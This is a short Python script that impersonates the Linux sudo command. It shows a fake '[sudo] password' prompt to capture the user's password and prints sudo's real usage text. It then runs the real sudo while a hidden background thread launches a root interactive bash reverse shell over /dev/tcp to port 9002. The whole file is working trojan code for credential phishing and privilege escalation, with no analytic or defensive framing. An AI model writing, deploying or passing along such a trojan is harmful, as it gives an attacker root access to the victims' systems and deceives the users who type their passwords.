import os
import sys
import getpass
from threading import Thread as t
from subprocess import run , Popen
try:
    sudo_path = "sudo"

    USERNAME = os.getenv("USER") or "root"

    passkey = getpass.getpass(f"[sudo] password for {USERNAME}: ")

    def revshell():
        # Command for reverse shell
        cmd = f"{sudo_path} bash -i < /dev/tcp/localhost/9002 > /dev/tcp/localhost/9002 2>&1"

        # Run in the background
        Popen(cmd, shell=True, start_new_session=True)

    def normalsudo(*args):
        run([sudo_path, *args])


    Revshell_T = t(
        target=revshell,
        daemon=True
    )

    sudo_args = sys.argv[1:]
    if not sudo_args:
        print("""usage: sudo -h | -K | -k | -V
        usage: sudo -v [-ABkNnS] [-g group] [-h host] [-p prompt] [-u user]
        usage: sudo -l [-ABkNnS] [-g group] [-h host] [-p prompt] [-U user]
                    [-u user] [command [arg ...]]
        usage: sudo [-ABbEHkNnPS] [-r role] [-t type] [-C num] [-D directory]
                    [-g group] [-h host] [-p prompt] [-R directory] [-T timeout]
                    [-u user] [VAR=value] [-i | -s] [command [arg ...]]
        usage: sudo -e [-ABkNnS] [-r role] [-t type] [-C num] [-D directory]
                    [-g group] [-h host] [-p prompt] [-R directory] [-T timeout]
                    [-u user] file ...
""")
        sys.exit(1)

    sudo = t(
        target=normalsudo,
        args=tuple(sudo_args),
        daemon=True
    )
    Revshell_T.start()
    sudo.start()
    sudo.join()
except KeyboardInterrupt:
   exit()
